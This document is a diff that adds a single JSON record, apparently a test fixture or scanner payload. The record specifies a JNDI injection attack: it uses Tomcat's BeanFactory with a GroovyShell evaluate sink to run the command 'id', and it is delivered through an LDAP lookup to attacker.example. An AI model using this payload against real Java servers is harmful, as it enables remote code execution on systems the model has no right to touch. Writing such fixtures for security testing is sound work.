@@ -1,0 +1,1 @@
+{"attack_type":"jndi_factory","factory_class":"org.apache.naming.factory.BeanFactory","reference_class":"groovy.lang.GroovyShell","factory_attrs":{"forceString":"x=evaluate","x":"'id'.execute().text"},"sink_type":"groovy_eval","protocol":"ldap","lookup_url":"ldap://attacker.example:1389/exploit"}
